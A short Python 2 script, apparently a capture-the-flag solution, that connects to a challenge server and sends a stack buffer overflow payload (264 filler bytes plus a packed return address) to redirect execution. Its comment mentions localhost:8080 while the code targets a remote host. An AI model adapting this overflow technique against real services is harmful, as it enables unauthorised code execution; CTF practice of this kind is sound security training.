#!/usr/bin/python

import socket
import struct
import time

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)


# Connect those sockets to localhost at port 8080
host = "buffer-overflow.ctfcompetition.com"
port = 1337

s.connect((host, port))

time.sleep(1)
print s.recv(4096)

s.send("run\n")

time.sleep(1)
print s.recv(4096)

# Overflow the buffer with A's
payload = 'A' * (256+8)  

# Adding the desired memory address to return to
payload += struct.pack('<q',0x0040085C)

# Sending payload
s.send(payload + "\n")

time.sleep(2)
print s.recv(4096)
